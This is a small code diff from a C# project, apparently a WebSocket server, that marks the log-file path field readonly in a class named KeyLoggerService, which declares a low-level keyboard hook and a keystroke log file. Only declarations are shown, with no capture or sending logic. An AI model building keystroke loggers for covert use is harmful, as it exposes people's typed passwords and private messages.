@@ -10,7 +10,7 @@ namespace WebSocketTest // Đổi namespace cho trùng với project Server
 {
     public static class KeyLoggerService
     {
-        private static string logPath = "fileKeyLog.txt";
+        private static readonly string logPath = "fileKeyLog.txt";
         private static IntPtr _hookID = IntPtr.Zero;
         private static LowLevelKeyboardProc _proc = HookCallback;
         private static bool _isRunning = false;
